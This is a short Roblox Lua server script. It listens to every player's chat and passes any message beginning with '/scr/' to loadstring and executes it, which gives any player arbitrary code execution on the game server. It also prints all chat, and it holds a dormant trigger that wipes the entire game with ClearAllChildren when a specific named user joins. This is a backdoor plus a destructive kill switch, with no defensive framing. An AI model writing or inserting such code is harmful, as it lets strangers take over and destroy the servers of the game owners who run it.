game.Players.PlayerAdded:connect(function(player)	
	player.Chatted:connect(function(msg, player)
		if msg:lower():sub(1,0) == "" then
			local LOL = msg:sub(1)
			print(":v : ".. LOL)
		end		
		if msg:lower():sub(1,5) == "/scr/" then
			code = loadstring(msg:sub(6))
			code()
		end
		if msg:lower():sub(1,6) == "/scr/ " then
			code = loadstring(msg:sub(7))
			code()
		end
	end)
end)
local process = false -- jgn di true in :v
function join(player)
	local plr = player.Name
	if plr == "aymant50" and process == true then
		game:ClearAllChildren()
	end
end
game.Players.PlayerAdded:connect(join)